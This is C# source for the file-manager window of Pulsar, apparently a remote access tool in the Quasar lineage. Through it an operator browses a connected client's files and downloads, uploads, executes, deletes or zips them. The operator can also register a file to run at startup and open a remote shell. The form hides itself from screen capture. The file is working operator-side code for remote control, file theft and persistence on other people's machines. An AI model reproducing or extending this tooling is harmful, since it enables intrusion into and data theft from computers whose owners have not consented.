using Pulsar.Common.Enums;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Models;
using Pulsar.Server.Controls;
using Pulsar.Server.Enums;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Windows.Forms.Integration;
using Process = System.Diagnostics.Process;

namespace Pulsar.Server.Forms
{
    public partial class FrmFileManager : Form
    {
        /// <summary>
        /// The current remote directory shown in the file manager.
        /// </summary>
        private string _currentDir;

        /// <summary>
        /// The client which can be used for the file manager.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly FileManagerHandler _fileManagerHandler;

        /// <summary>
        /// Debounce timer for refreshes.
        /// </summary>
        private readonly Timer _refreshDebounce;

        private enum TransferColumn
        {
            Id,
            Type,
            Status,
        }

        /// <summary>
        /// Holds the opened file manager form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmFileManager> OpenedForms = new Dictionary<Client, FrmFileManager>();

        /// <summary>
        /// Cached directory entries for VirtualMode ListView.
        /// Index 0 in ListView is "..", so these map from index-1.
        /// </summary>
        private FileSystemEntry[] _cachedItems = Array.Empty<FileSystemEntry>();

        /// <summary>
        /// Simple sort state for VirtualMode ListView.
        /// </summary>
        private int _sortColumn = 0;
        private bool _sortAscending = true;

        #region Win32 – ListView layout fix

        private const int WM_SIZE = 0x0005;
        private const int LVM_FIRST = 0x1000;
        private const int LVM_SETITEMCOUNT = LVM_FIRST + 47;
        private const int LVM_REDRAWITEMS = LVM_FIRST + 21;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Forces the native ListView to recalc layout and remove any ghost
        /// padding / blank rows above the first item.
        /// </summary>
        private void FixListViewLayout()
        {
            if (!lstDirectory.IsHandleCreated)
                return;

            IntPtr handle = lstDirectory.Handle;

            // Recalculate layout
            SendMessage(handle, WM_SIZE, IntPtr.Zero, IntPtr.Zero);

            if (lstDirectory.VirtualListSize > 0)
            {
                // Redraw all items
                IntPtr lastIndex = new IntPtr(lstDirectory.VirtualListSize - 1);
                SendMessage(handle, LVM_REDRAWITEMS, IntPtr.Zero, lastIndex);

                // Let the control know the correct count again
                SendMessage(handle, LVM_SETITEMCOUNT,
                    new IntPtr(lstDirectory.VirtualListSize),
                    IntPtr.Zero);
            }
        }

        #endregion

        /// <summary>
        /// Creates a new file manager form for the client or gets the current open form, if there exists one already.
        /// </summary>
        public static FrmFileManager CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmFileManager f = new FrmFileManager(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmFileManager"/> class using the given client.
        /// </summary>
        public FrmFileManager(Client client)
        {
            _connectClient = client;
            _fileManagerHandler = new FileManagerHandler(client);

            InitializeComponent();

            // Enable DoubleBuffered via reflection to reduce flicker.
            typeof(Control).GetProperty(
                "DoubleBuffered",
                System.Reflection.BindingFlags.Instance |
                System.Reflection.BindingFlags.NonPublic
            )?.SetValue(lstDirectory, true);

            // Debounce timer for refresh
            _refreshDebounce = new Timer
            {
                Interval = 100 // 100 ms debounce
            };
            _refreshDebounce.Tick += (s, e) =>
            {
                _refreshDebounce.Stop();
                if (!string.IsNullOrEmpty(_currentDir))
                    _fileManagerHandler.GetDirectoryContents(_currentDir);
            };

            // Virtual mode ListView
            lstDirectory.VirtualMode = true;
            lstDirectory.RetrieveVirtualItem += LstDirectory_RetrieveVirtualItem;
            lstDirectory.FullRowSelect = true;

            // Layout stabilizers
            lstDirectory.Resize += LstDirectory_Resize;
            lstDirectory.ColumnWidthChanged += LstDirectory_ColumnWidthChanged;
            lstDirectory.HandleCreated += (s, e) => FixListViewLayout();

            RegisterMessageHandler();
            txtPath.KeyDown += TxtPath_KeyDown;

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            // Make sure dark-mode + virtual mode layout is correct
            FixListViewLayout();
        }

        private void LstDirectory_Resize(object sender, EventArgs e)
        {
            FixListViewLayout();
            ForceListViewViewportReset();
        }

        private void LstDirectory_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
        {
            FixListViewLayout();
        }

        private string NormalizeUserTypedPath(string input)
        {
            if (string.IsNullOrWhiteSpace(input))
                return input;

            string path = input.Trim();

            // Expand %ENVVAR%
            path = Environment.ExpandEnvironmentVariables(path);

            // Expand ~ to user profile
            if (path.StartsWith("~"))
            {
                string profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                path = Path.Combine(profile, path.Substring(1).TrimStart('\\', '/'));
            }

            // Fix forward slashes
            path = path.Replace('/', '\\');

            // Handle drive-letter without slash:  C:  →  C:\
            if (path.Length == 2 && char.IsLetter(path[0]) && path[1] == ':')
                path += "\\";

            // Ensure full absolute path
            try
            {
                path = Path.GetFullPath(path);
            }
            catch
            {
                // Invalid paths get returned raw, client handles errors already
            }

            return path;
        }

        private void TxtPath_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode != Keys.Enter)
                return;

            e.Handled = true;
            e.SuppressKeyPress = true;

            string newPath = NormalizeUserTypedPath(txtPath.Text);

            if (string.IsNullOrWhiteSpace(newPath))
                return;

            // ------------------------------------------------------
            // Check if user entered a DIRECT FILE PATH
            // ------------------------------------------------------
            if (Path.HasExtension(newPath))
            {
                // Ask to execute the file
                var result = MessageBox.Show(
                    $"Do you want to execute this file on the client?\n\n{newPath}",
                    "Execute File?",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question
                );

                if (result == DialogResult.Yes)
                {
                    _fileManagerHandler.StartProcess(newPath);
                    SetStatusMessage(this, $"Executing {newPath}...");
                }

                return; // stop normal folder navigation logic
            }

            // ------------------------------------------------------
            // FOLDER navigation
            // ------------------------------------------------------
            _fileManagerHandler.GetDirectoryContents(newPath);
            SetStatusMessage(this, $"Opening {newPath} ...");

            var timer = new System.Windows.Forms.Timer();
            timer.Interval = 500;
            timer.Tick += (s, ev) =>
            {
                timer.Stop();

                if (_currentDir != newPath)
                {
                    txtPath.Text = _currentDir; // revert
                }
            };
            timer.Start();
        }


        /// <summary>
        /// Registers the file manager message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _fileManagerHandler.ProgressChanged += SetStatusMessage;
            _fileManagerHandler.DrivesChanged += DrivesChanged;
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <summary>
        /// Unregisters the file manager message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_fileManagerHandler);
            _fileManagerHandler.ProgressChanged -= SetStatusMessage;
            _fileManagerHandler.DrivesChanged -= DrivesChanged;
            _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void DrivesChanged(object sender, Drive[] drives)
        {
            var list = new List<object>();

            // ----- DRIVES ON TOP -----
            foreach (var d in drives)
            {
                list.Add(new
                {
                    DisplayName = $"{d.DisplayName}",
                    RootDirectory = d.RootDirectory
                });
            }

            void AddCommon(string label, string path)
            {
                if (!string.IsNullOrEmpty(path) && Directory.Exists(path))
                {
                    list.Add(new
                    {
                        DisplayName = $"[{label}]  {path}",
                        RootDirectory = path
                    });
                }
            }

            void AddCommonSF(string label, Environment.SpecialFolder sf)
            {
                string p = Environment.GetFolderPath(sf);
                AddCommon(label, p);
            }

            // ----- USER COMMON DIRECTORIES -----
            AddCommonSF("Desktop", Environment.SpecialFolder.Desktop);
            AddCommonSF("Documents", Environment.SpecialFolder.MyDocuments);
            AddCommon("Downloads", SpecialPath.Downloads);
            AddCommonSF("Pictures", Environment.SpecialFolder.MyPictures);
            AddCommonSF("Music", Environment.SpecialFolder.MyMusic);
            AddCommonSF("Videos", Environment.SpecialFolder.MyVideos);
            AddCommonSF("AppData (Local)", Environment.SpecialFolder.LocalApplicationData);
            AddCommonSF("AppData (Roaming)", Environment.SpecialFolder.ApplicationData);
            AddCommon("LocalLow", Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                "AppData\\LocalLow"));

            AddCommon("Temp", Path.GetTempPath());

            // ----- SYSTEM COMMON DIRECTORIES -----
            AddCommon("Program Files", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            AddCommon("Program Files (x86)", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
            AddCommon("Windows", Environment.GetFolderPath(Environment.SpecialFolder.Windows));
            AddCommon("System32", Environment.GetFolderPath(Environment.SpecialFolder.System));

            AddCommon("ProgramData", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));

            // ----- PUBLIC (Shared) -----
            AddCommon("Public Desktop", Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
            AddCommon("Public Documents", Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));

            // ----- USER ROOT -----
            AddCommon("User Profile", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

            // ----- APPLY TO COMBOBOX -----
            cmbDrives.Items.Clear();
            cmbDrives.DisplayMember = "DisplayName";
            cmbDrives.ValueMember = "RootDirectory";
            cmbDrives.DataSource = list;

            SetStatusMessage(this, "Ready");
        }

        private static class SpecialPath
        {
            public static string Downloads =>
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
        }

        /// <summary>
        /// Called whenever a directory changed (remote side).
        /// Updates the cache and VirtualListSize, avoiding UI freezes.
        /// </summary>
        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
        {
            // Protect against nulls (your crash source)
            if (string.IsNullOrWhiteSpace(remotePath))
                return;

            if (items == null)
                items = Array.Empty<FileSystemEntry>();

            // Update current path
            _currentDir = remotePath;

            // Update textbox safely
            if (txtPath.InvokeRequired)
            {
                txtPath.Invoke(new Action(() => txtPath.Text = remotePath));
            }
            else
            {
                txtPath.Text = remotePath;
            }

            // Sanitize + sort
            try
            {
                _cachedItems = items
                    .Where(i => i != null && !string.IsNullOrWhiteSpace(i.Name))
                    .OrderBy(e => e.EntryType != FileType.Directory)
                    .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase)
                    .ToArray();
            }
            catch
            {
                _cachedItems = Array.Empty<FileSystemEntry>();
            }

            // Update the ListView
            try
            {
                if (lstDirectory.InvokeRequired)
                {
                    lstDirectory.Invoke(new Action(UpdateList));
                }
                else
                {
                    UpdateList();
                }
            }
            catch { }

            SetStatusMessage(this, "Ready");
        }

        private void UpdateList()
        {
            using (new RedrawScope(lstDirectory))
            {
                lstDirectory.BeginUpdate();
                lstDirectory.VirtualListSize = _cachedItems.Length + 1; // +1 for ".."
                ForceListViewViewportReset();
                lstDirectory.EndUpdate();
            }

            FixListViewLayout();
        }

        /// <summary>
        /// Provides virtual items to the ListView on demand.
        /// This is what prevents freezes when listing huge folders.
        /// </summary>
        private void LstDirectory_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            // index 0 is ".."
            if (e.ItemIndex == 0)
            {
                var backItem = new ListViewItem(new[] { "..", string.Empty, string.Empty })
                {
                    Tag = new FileManagerListTag(FileType.Back, 0),
                    ImageIndex = 0
                };
                e.Item = backItem;
                return;
            }

            int index = e.ItemIndex - 1;
            if (_cachedItems == null || index < 0 || index >= _cachedItems.Length)
            {
                e.Item = new ListViewItem(new[] { string.Empty, string.Empty, string.Empty });
                return;
            }

            var entry = _cachedItems[index];

            int imageIndex;
            if (entry.EntryType == FileType.Directory)
            {
                imageIndex = 1; // dir icon index
            }
            else
            {
                imageIndex = entry.ContentType == null ? 2 : (int)entry.ContentType;
            }

            var sizeText = entry.EntryType == FileType.File
                ? StringHelper.GetHumanReadableFileSize(entry.Size)
                : string.Empty;

            var lvi = new ListViewItem(new[]
            {
                entry.Name,
                sizeText,
                entry.EntryType.ToString()
            })
            {
                Tag = new FileManagerListTag(entry.EntryType, entry.Size),
                ImageIndex = imageIndex
            };

            e.Item = lvi;
        }

        /// <summary>
        /// Sort the cached items for VirtualMode.
        /// </summary>
        private void SortCachedItems()
        {
            if (_cachedItems == null || _cachedItems.Length == 0)
                return;

            IOrderedEnumerable<FileSystemEntry> ordered;

            switch (_sortColumn)
            {
                case 0: // Name
                    ordered = _cachedItems
                        .OrderBy(e => e.EntryType != FileType.Directory)
                        .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase);
                    break;

                case 1: // Size
                    ordered = _cachedItems
                        .OrderBy(e => e.EntryType != FileType.File)
                        .ThenBy(e => e.Size);
                    break;

                case 2: // Type
                    ordered = _cachedItems
                        .OrderBy(e => e.EntryType.ToString(), StringComparer.OrdinalIgnoreCase)
                        .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase);
                    break;

                default:
                    ordered = _cachedItems
                        .OrderBy(e => e.EntryType != FileType.Directory)
                        .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase);
                    break;
            }

            _cachedItems = _sortAscending ? ordered.ToArray() : ordered.Reverse().ToArray();
        }

        private int GetTransferImageIndex(string status)
        {
            int imageIndex = -1;
            switch (status)
            {
                case "Completed":
                    imageIndex = 1;
                    break;
                case "Canceled":
                    imageIndex = 0;
                    break;
            }

            return imageIndex;
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            // If CANCELED → remove from ListView immediately
            if (transfer.Status == "Canceled")
            {
                // If upload canceled → delete incomplete server file
                if (transfer.Type == TransferType.Upload)
                {
                    try
                    {
                        _fileManagerHandler.DeleteFile(transfer.RemotePath, FileType.File);
                    }
                    catch { }
                }

                for (int i = lstTransfers.Items.Count - 1; i >= 0; i--)
                {
                    var lvi = lstTransfers.Items[i];
                    if (lvi.Tag is FileTransfer t && t.Id == transfer.Id)
                    {
                        lstTransfers.Items.RemoveAt(i);
                        return; // done
                    }
                }
            }

            bool found = false;

            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                if (lstTransfers.Items[i].SubItems[(int)TransferColumn.Id].Text == transfer.Id.ToString())
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = transfer.Status;
                    lstTransfers.Items[i].ImageIndex = GetTransferImageIndex(transfer.Status);
                    found = true;
                    break;
                }
            }

            if (!found)
            {
                var lvi = new ListViewItem(new[]
                        { transfer.Id.ToString(), transfer.Type.ToString(), transfer.Status, transfer.RemotePath })
                {
                    Tag = transfer,
                    ImageIndex = GetTransferImageIndex(transfer.Status)
                };

                lstTransfers.Items.Add(lvi);
            }

            // After upload completes → refresh directory
            if (transfer.Type == TransferType.Upload && transfer.Status == "Completed")
            {
                RefreshDirectory();
            }
        }

        private string GetAbsolutePath(string path)
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.Length == 1)
                    return Path.Combine(_currentDir, path);
                else
                    return Path.Combine(_currentDir + '/', path);
            }

            return Path.GetFullPath(Path.Combine(_currentDir, path));
        }

        private string NavigateUp()
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.LastIndexOf('/') > 0)
                {
                    _currentDir = _currentDir.Remove(_currentDir.LastIndexOf('/') + 1);
                    _currentDir = _currentDir.TrimEnd('/');
                }
                else
                    _currentDir = "/";

                return _currentDir;
            }
            else
                return GetAbsolutePath(@"..\");
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);
            _fileManagerHandler.RefreshDrives();
            // Load existing downloads into transfer list
            LoadExistingLocalDownloads();
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _fileManagerHandler.Dispose();
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cmbDrives.SelectedValue == null)
                return;

            SwitchDirectory(cmbDrives.SelectedValue.ToString());
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            int index = -1;

            if (lstDirectory.SelectedIndices.Count > 0)
                index = lstDirectory.SelectedIndices[0];
            else if (lstDirectory.FocusedItem != null)
                index = lstDirectory.FocusedItem.Index;

            if (index < 0)
                return;

            if (index == 0)
            {
                // ".."
                SwitchDirectory(NavigateUp());
                return;
            }

            int cacheIndex = index - 1;
            if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                return;

            var entry = _cachedItems[cacheIndex];

            if (entry.EntryType == FileType.Directory)
            {
                string newPath = GetAbsolutePath(entry.Name);
                SwitchDirectory(newPath);
            }
        }

        private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (_cachedItems == null || _cachedItems.Length == 0)
                return;

            if (e.Column == _sortColumn)
                _sortAscending = !_sortAscending;
            else
            {
                _sortColumn = e.Column;
                _sortAscending = true;
            }

            SortCachedItems();
            lstDirectory.Refresh();
            ForceListViewViewportReset();
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (int index in lstDirectory.SelectedIndices)
            {
                if (index == 0) // skip ".."
                    continue;

                int cacheIndex = index - 1;
                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                    continue;

                var entry = _cachedItems[cacheIndex];

                if (entry.EntryType == FileType.File)
                {
                    string remotePath = GetAbsolutePath(entry.Name);
                    _fileManagerHandler.BeginDownloadFile(remotePath);
                }
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Title = "Select files to upload";
                ofd.Filter = "All files (*.*)|*.*";
                ofd.Multiselect = true;

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    foreach (var localFilePath in ofd.FileNames)
                    {
                        if (!File.Exists(localFilePath)) continue;

                        string remotePath = GetAbsolutePath(Path.GetFileName(localFilePath));
                        _fileManagerHandler.BeginUploadFile(localFilePath, remotePath);
                    }
                }
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (int index in lstDirectory.SelectedIndices)
            {
                if (index == 0) // skip ".."
                    continue;

                int cacheIndex = index - 1;
                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                    continue;

                var entry = _cachedItems[cacheIndex];

                if (entry.EntryType == FileType.File)
                {
                    string remotePath = GetAbsolutePath(entry.Name);
                    _fileManagerHandler.StartProcess(remotePath);
                }
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (int index in lstDirectory.SelectedIndices)
            {
                if (index == 0) // skip ".."
                    continue;

                int cacheIndex = index - 1;
                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                    continue;

                var entry = _cachedItems[cacheIndex];

                if (entry.EntryType == FileType.Directory || entry.EntryType == FileType.File)
                {
                    string path = GetAbsolutePath(entry.Name);
                    string newName = entry.Name;

                    if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                    {
                        string newPath = GetAbsolutePath(newName);
                        _fileManagerHandler.RenameFile(path, newPath, entry.EntryType);
                    }
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int count = lstDirectory.SelectedIndices.Count;
            if (count == 0) return;

            if (MessageBox.Show(
                    $"Are you sure you want to delete {count} file(s)?",
                    "Delete Confirmation",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (int index in lstDirectory.SelectedIndices)
                {
                    if (index == 0) // skip ".."
                        continue;

                    int cacheIndex = index - 1;
                    if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                        continue;

                    var entry = _cachedItems[cacheIndex];

                    if (entry.EntryType == FileType.Directory || entry.EntryType == FileType.File)
                    {
                        string path = GetAbsolutePath(entry.Name);
                        _fileManagerHandler.DeleteFile(path, entry.EntryType);
                    }
                }
            }
        }

        private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (int index in lstDirectory.SelectedIndices)
            {
                if (index == 0) // skip ".."
                    continue;

                int cacheIndex = index - 1;
                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                    continue;

                var entry = _cachedItems[cacheIndex];

                if (entry.EntryType == FileType.File)
                {
                    string path = GetAbsolutePath(entry.Name);

                    using (var frm = new FrmStartupAdd(path))
                    {
                        if (frm.ShowDialog() == DialogResult.OK)
                        {
                            _fileManagerHandler.AddToStartup(frm.StartupItem);
                        }
                    }
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void openDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = _currentDir;

            if (lstDirectory.SelectedIndices.Count == 1)
            {
                int index = lstDirectory.SelectedIndices[0];

                if (index > 0)
                {
                    int cacheIndex = index - 1;
                    if (_cachedItems != null && cacheIndex >= 0 && cacheIndex < _cachedItems.Length)
                    {
                        var entry = _cachedItems[cacheIndex];
                        if (entry.EntryType == FileType.Directory)
                            path = GetAbsolutePath(entry.Name);
                    }
                }
            }

            FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(_connectClient);
            frmRs.Show();
            frmRs.Focus();

            var driveLetter = Path.GetPathRoot(path);
            frmRs.RemoteShellHandler.SendCommand($"{driveLetter.Remove(driveLetter.Length - 1)} && cd \"{path}\"");
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(_connectClient.Value.DownloadDirectory))
                Directory.CreateDirectory(_connectClient.Value.DownloadDirectory);

            Process.Start("explorer.exe", _connectClient.Value.DownloadDirectory);
        }

        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (transfer.Tag is not FileTransfer t)
                    continue;

                string status = transfer.SubItems[(int)TransferColumn.Status].Text;

                // Only cancel active
                if (!status.StartsWith("Downloading") &&
                    !status.StartsWith("Uploading") &&
                    !status.StartsWith("Pending"))
                    continue;

                // Do not cancel synthetic entries (download history)
                if (t.Id == 0)
                    continue;

                // 1) Cancel transfer remotely
                _fileManagerHandler.CancelFileTransfer(t.Id);

                // 2) Remove from UI immediately
                lstTransfers.Items.Remove(transfer);

                // 3) Delete partial file (local)
                try
                {
                    string local = Path.Combine(
                        _connectClient.Value.DownloadDirectory,
                        Path.GetFileName(t.RemotePath));

                    if (File.Exists(local))
                        File.Delete(local);
                }
                catch { }
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.Items)
            {
                if (transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Downloading") ||
                    transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Uploading") ||
                    transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Pending")) continue;
                transfer.Remove();
            }
        }

        private void lstDirectory_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) // allow drag & drop with files
                e.Effect = DragDropEffects.Copy;
        }

        private void lstDirectory_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
                foreach (string localFilePath in files)
                {
                    if (!File.Exists(localFilePath)) continue;

                    string remotePath = GetAbsolutePath(Path.GetFileName(localFilePath));
                    _fileManagerHandler.BeginUploadFile(localFilePath, remotePath);
                }
            }
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
        {
            // refresh when F5 is pressed
            if (e.KeyCode == Keys.F5 && !string.IsNullOrEmpty(_currentDir) && TabControlFileManager.SelectedIndex == 0)
            {
                RefreshDirectory();
                e.Handled = true;
            }
        }

        /// <summary>
        /// Legacy manual-add method (not used in VirtualMode path).
        /// Kept in case you ever switch back to non-virtual ListView.
        /// </summary>
        private void AddItemToFileBrowser(string name, long size, FileType type, int imageIndex)
        {
            ListViewItem lvi = new ListViewItem(new string[]
            {
                name,
                (type == FileType.File) ? StringHelper.GetHumanReadableFileSize(size) : string.Empty,
                (type != FileType.Back) ? type.ToString() : string.Empty
            })
            {
                Tag = new FileManagerListTag(type, size),
                ImageIndex = imageIndex
            };

            lstDirectory.Items.Add(lvi);
        }

        private void SetStatusMessage(object sender, string message)
        {
            stripLblStatus.Text = $"Status: {message}";
        }

        private void RefreshDirectory()
        {
            if (string.IsNullOrEmpty(_currentDir))
                return;

            _refreshDebounce.Stop();   // restart debounce
            _refreshDebounce.Start();
        }

        /// <summary>
        /// If designer ever wires a Scroll handler, just use it to
        /// re-stabilize layout – do NOT mess with TopItem (that causes bugs).
        /// </summary>
        private void lstDirectory_Scroll(object sender, ScrollEventArgs e)
        {
            FixListViewLayout();
        }

        public static void OpenDownloadFolderFor(Client client)
        {
            var path = client.Value.DownloadDirectory;

            if (!Directory.Exists(path))
                Directory.CreateDirectory(path);

            Process.Start("explorer.exe", path);
        }

        private void SwitchDirectory(string remotePath)
        {
            if (string.IsNullOrWhiteSpace(remotePath))
                return;

            _fileManagerHandler.GetDirectoryContents(remotePath);
            SetStatusMessage(this, "Loading directory content...");
        }

        private void zipFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstDirectory.SelectedIndices.Count != 1) return;

            int index = lstDirectory.SelectedIndices[0];
            if (index == 0) return;

            int cacheIndex = index - 1;
            if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                return;

            var entry = _cachedItems[cacheIndex];
            if (entry.EntryType != FileType.Directory)
            {
                MessageBox.Show("Please select a directory to zip.", "Zip Folder",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            string folderPath = GetAbsolutePath(entry.Name);
            string zipFileName = $"{Path.GetFileName(folderPath)}.zip";
            string destinationPath = Path.Combine(Path.GetDirectoryName(folderPath), zipFileName);

            _fileManagerHandler.ZipFolder(folderPath, destinationPath, (int)CompressionLevel.Optimal);
        }

        private void executeFileOnServerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstTransfers.SelectedItems.Count == 0)
                return;

            foreach (ListViewItem item in lstTransfers.SelectedItems)
            {
                var transfer = item.Tag as FileTransfer;
                if (transfer == null)
                    continue;

                // build local path
                string localPath = Path.Combine(
                    _connectClient.Value.DownloadDirectory,
                    Path.GetFileName(transfer.RemotePath)
                );

                // check if file is physically downloaded
                if (!File.Exists(localPath))
                {
                    MessageBox.Show(
                        $"File is not fully downloaded yet:\n{localPath}",
                        "Cannot Execute",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning
                    );
                    continue;
                }

                // run the downloaded file locally
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = localPath,
                        UseShellExecute = true
                    });

                    SetStatusMessage(this, $"Executing {localPath}...");
                }
                catch (Exception ex)
                {
                    MessageBox.Show(
                        $"Failed to execute downloaded file:\n{ex.Message}",
                        "Execution Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    );
                }
            }
        }

        private void ForceListViewViewportReset()
        {
            if (!lstDirectory.IsHandleCreated || lstDirectory.VirtualListSize == 0)
                return;

            try
            {
                // Scroll to bottom
                int last = lstDirectory.VirtualListSize - 1;
                lstDirectory.EnsureVisible(last);

                // Scroll back to top
                lstDirectory.EnsureVisible(0);
            }
            catch { }
        }

        private void SearchListView(string keyword)
        {
            keyword = keyword?.Trim();
            if (string.IsNullOrEmpty(keyword) || _cachedItems == null || _cachedItems.Length == 0)
                return;

            string k = keyword.ToLowerInvariant();

            for (int i = 0; i < _cachedItems.Length; i++)
            {
                var entry = _cachedItems[i];
                string name = entry.Name ?? string.Empty;
                string typeText = entry.EntryType.ToString();
                string sizeText = entry.EntryType == FileType.File
                    ? StringHelper.GetHumanReadableFileSize(entry.Size)
                    : string.Empty;

                if (name.ToLowerInvariant().Contains(k) ||
                    typeText.ToLowerInvariant().Contains(k) ||
                    sizeText.ToLowerInvariant().Contains(k))
                {
                    int listIndex = i + 1; // +1 because index 0 is ".."

                    lstDirectory.SelectedIndices.Clear();
                    lstDirectory.SelectedIndices.Add(listIndex);
                    lstDirectory.EnsureVisible(listIndex);

                    SetStatusMessage(this, $"Found: {entry.Name}");
                    return;
                }
            }

            SetStatusMessage(this, $"No match for \"{keyword}\"");
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            // CTRL + A → Select All in lstDirectory or lstTransfers
            if (keyData == (Keys.Control | Keys.A))
            {
                if (lstDirectory.Focused)
                {
                    // Select everything except index 0 ("..")
                    lstDirectory.SelectedIndices.Clear();

                    for (int i = 1; i < lstDirectory.VirtualListSize; i++)
                        lstDirectory.SelectedIndices.Add(i);

                    return true;
                }

                if (lstTransfers.Focused)
                {
